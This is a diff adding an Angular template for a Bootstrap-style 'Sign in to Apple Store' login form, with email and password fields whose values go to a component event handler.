@@ -1,0 +1,18 @@
+<div class="text-center">
+  <form class="form-signin">
+    <h1 class="h3 mb-3 font-weight-normal">Sign in to Apple Store</h1>
+    <label for="inputEmail" class="sr-only">Apple ID</label>
+    <input type="text" #email required id="inputEmail" class="form-control" placeholder="Email address">
+    <label for="inputPassword" class="sr-only">Password</label>
+    <input type="password" #password id="inputPassword" class="form-control" placeholder="Password">
+    <div class="checkbox mb-3">
+      <label>
+        <input type="checkbox" value="remember-me"> Remember me
+      </label>
+    </div>
+    <a class="btn btn-outline-secondary" (click)="userEvent(email.value, password.value)">Sign in</a>
+    <hr>
+    <p><small><a href="#">Forgot Apple ID or password?</a></small></p>
+    <p><small>Don’t have an Apple ID? <a href="#">Create yours now.</a></small></p>
+  </form>
+</div>
